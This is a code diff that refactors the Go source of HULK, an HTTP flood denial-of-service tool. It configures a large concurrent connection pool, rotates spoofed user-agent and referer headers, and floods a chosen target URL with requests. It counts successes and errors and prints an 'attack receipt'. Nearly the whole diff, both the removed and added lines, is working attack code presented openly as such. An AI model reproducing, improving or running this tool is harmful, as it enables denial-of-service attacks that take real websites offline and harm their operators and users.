@@ -25,51 +25,42 @@ import (
 	"time"
 )
 
-const __version__ = "1.0.1"
-
-var mu *sync.Mutex
-var rtime time.Duration
-var reqs int64
-var startT time.Time
-var max int
+const version = "1.0.1"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk uint8 = iota
-	callExitOnErr
-	callExitOnTooManyFiles
-	targetComplete
+	onSuccess uint8 = iota
+	onError
+	onFileError
+	on500
 )
 
-// global params
-var (
-	safe            bool     = false
-	headersReferers []string = []string{
-		"http://www.google.com/?q=",
-		"http://www.usatoday.com/search/results?q=",
-		"http://engadget.search.aol.com/search?q=",
-		//"http://www.google.ru/?hl=ru&q=",
-		//"http://yandex.ru/yandsearch?text=",
-	}
-	headersUseragents []string = []string{
-		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
-		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
-		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
-		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
-		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
-		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
-	}
-	cur int32
-)
+var currNumReqs int32
+var safe = false
+var headersReferers = []string{
+	"http://www.google.com/?q=",
+	"http://www.usatoday.com/search/results?q=",
+	"http://engadget.search.aol.com/search?q=",
+	//"http://www.google.ru/?hl=ru&q=",
+	//"http://yandex.ru/yandsearch?text=",
+}
+var headersUseragents = []string{
+	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
+	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
+	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
+	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
+	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
+	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
+	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
+	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
+	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+}
 
 type arrayFlags []string
 
@@ -82,43 +73,54 @@ func (i *arrayFlags) Set(value string) error {
 	return nil
 }
 
+type config struct {
+	verbose      bool
+	numProcesses int
+	maxRequests  int
+	runningTime  time.Duration
+	startTime    time.Time
+	maxProcs     int
+	mu           *sync.Mutex
+}
+
+var c *config
+
 func main() {
-	var (
-		version bool
-		site    string
-		agents  string
-		data    string
-		headers arrayFlags
-	)
 
-	mu = &sync.Mutex{}
-	reqs = 1
-	startT = time.Now()
+	c = &config{
+		startTime: time.Now(),
+		mu:        &sync.Mutex{},
+	}
 
-	flag.BoolVar(&version, "version", false, "print version and exit")
+	var versionFlag, safe bool
+	var target, agents, data string
+	var headers arrayFlags
+
+	flag.IntVar(&c.maxRequests, "max", 0, "Max number of requests, defaults to no maximum")
+	flag.IntVar(&c.maxProcs, "maxProcs", 1024, "Size of connection pool")
+	flag.BoolVar(&c.verbose, "verbose", false, "print errors to console")
+	flag.BoolVar(&versionFlag, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
+	flag.StringVar(&target, "target", "", "target url.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
-	flag.IntVar(&max, "max", -1, "Max number of requests, defaults to inf")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
-	t := os.Getenv("HULKMAXPROCS")
-	maxproc, err := strconv.Atoi(t)
-	if err != nil {
-		maxproc = 1023
+	if versionFlag {
+		fmt.Println("HULK", version)
+		os.Exit(0)
 	}
 
-	u, err := url.Parse(site)
-	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+	if target == "" {
+		fmt.Println("must specify target flag with url")
 		os.Exit(1)
 	}
 
-	if version {
-		fmt.Println("Hulk", __version__)
-		os.Exit(0)
+	targetURL, err := url.Parse(target)
+	if err != nil {
+		fmt.Println("error parsing url parameter, must specify target flag with url")
+		os.Exit(1)
 	}
 
 	if agents != "" {
@@ -136,44 +138,53 @@ func main() {
 		}
 	}
 
+	// counters
+	var total, success, errs, errFiles int
+
+	m := make(map[string]int)
+
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
-		ss := make(chan uint8, 8)
-		var (
-			err, sent int32
-		)
+		resultChan := make(chan uint8, 8)
+
+		fmt.Printf("-- HULK Attack Started --\n   Go!\n\n")
 		fmt.Println("In use               |\tResp OK |\tGot err |\tTime (ms)")
 		for {
+
 			t := time.Now()
-			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-				go httpcall(site, u.Host, data, headers, ss)
-			}
-			if sent%10 == 0 || err%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d  |\t%6vms", cur, maxproc, sent, err, float64(int64(rtime)/int64(time.Millisecond))/float64(reqs))
-			}
-			switch <-ss {
-			case callExitOnErr:
-				updateTime(t)
-				atomic.AddInt32(&cur, -1)
-				err++
-			case callExitOnTooManyFiles:
-				updateTime(t)
-				atomic.AddInt32(&cur, -1)
-				maxproc--
-				err++
-			case callGotOk:
-				updateTime(t)
-				sent++
-			case targetComplete:
-				updateTime(t)
-				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
-				os.Exit(0)
+
+			if atomic.LoadInt32(&currNumReqs) < int32(c.maxProcs-1) {
+				go httpcall(target, targetURL.Host, data, headers, resultChan, m)
 			}
 
-			if max != -1 && reqs > int64(max) {
-				report()
+			if total%10 == 0 || errs%10 == 0 {
+				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d  |\t%-20v", currNumReqs, c.maxProcs, success, errs, float64(int64(c.runningTime)/int64(time.Millisecond))/float64(total))
+			}
+
+			total++
+			switch <-resultChan {
+			case onSuccess:
+				updateLog(t)
+				success++
+
+			case onError:
+				updateLog(t)
+				atomic.AddInt32(&currNumReqs, -1)
+				errs++
+
+			case onFileError:
+				updateLog(t)
+				c.maxProcs--
+				errs++
+				errFiles++
+
+			case on500:
+				updateLog(t)
+				errs++
+				report(total, success, errs, m)
+			}
+
+			if c.maxRequests != 0 && total > c.maxRequests {
+				report(total, success, errs, m)
 			}
 		}
 	}()
@@ -181,25 +192,32 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	report()
+
+	report(total, success, errs, m)
 }
 
-func report() {
-	fmt.Printf("\r\n-- Interrupted by user --        \n")
-	fmt.Printf("sent %d requests over %s\n", reqs, time.Since(startT).String())
+func report(total, success, err int, errors map[string]int) {
+	fmt.Println("\n\n-- HULK Attack Receipt -- ")
+	fmt.Printf(" %s attack duration\n", time.Since(c.startTime).String())
+	fmt.Printf(" %d requests\n", total)
+	fmt.Printf(" %d successful responses\n", success)
+	fmt.Printf(" %d total errors\n", err)
+	fmt.Println("Reported errors")
+	for k, v := range errors {
+		fmt.Printf("%10d : %v\n", v, k)
+	}
 	os.Exit(0)
 }
 
-func updateTime(t time.Time) {
-	td := time.Since(t)
-	mu.Lock()
-	rtime += td
-	reqs++
-	mu.Unlock()
+func updateLog(t time.Time) {
+	timeDelta := time.Since(t)
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	c.runningTime += timeDelta
 }
 
-func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
-	atomic.AddInt32(&cur, 1)
+func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8, m map[string]int) {
+	atomic.AddInt32(&currNumReqs, 1)
 
 	var param_joiner string
 	var client = new(http.Client)
@@ -221,7 +239,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		}
 
 		if err != nil {
-			s <- callExitOnErr
+			s <- onError
 			return
 		}
 
@@ -234,7 +252,6 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Host", host)
 
 		// Overwrite headers with parameters
-
 		for _, element := range headers {
 			words := strings.Split(element, ":")
 			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
@@ -242,26 +259,37 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 
 		r, e := client.Do(q)
 		if e != nil {
-			// fmt.Fprintln(os.Stderr, e.Error())
+
+			errString := ""
 			if strings.Contains(e.Error(), "socket: too many open files") {
-				// fmt.Println("call on exit err")
-				s <- callExitOnTooManyFiles
-				return
-			} else if strings.Contains(e.Error(), "read: connection reset by peer") {
-				// fmt.Println(e.Error())
-				s <- callExitOnErr
-				return
+				errString = "socket: too many open files"
+				s <- onFileError
+			} else {
+
+				if strings.Contains(e.Error(), "read: connection reset by peer") {
+					errString = "read: connection reset by peer"
+				} else if strings.Contains(e.Error(), "read: connection refused") {
+					errString = "read: connection refused"
+				} else if strings.Contains(e.Error(), "connect: can't assign requested address") {
+					errString = "connect: can't assign requested address"
+				} else {
+					errString = e.Error()
+				}
+
+				s <- onError
 			}
-			// fmt.Println("other error = ", e.Error())
-			s <- callExitOnErr
+
+			c.mu.Lock()
+			m[errString]++
+			c.mu.Unlock()
 			return
 		}
+
 		r.Body.Close()
-		s <- callGotOk
-		if safe {
-			if r.StatusCode >= 500 {
-				s <- targetComplete
-			}
+		s <- onSuccess
+
+		if r.StatusCode >= 500 {
+			s <- on500
 		}
 	}
 }
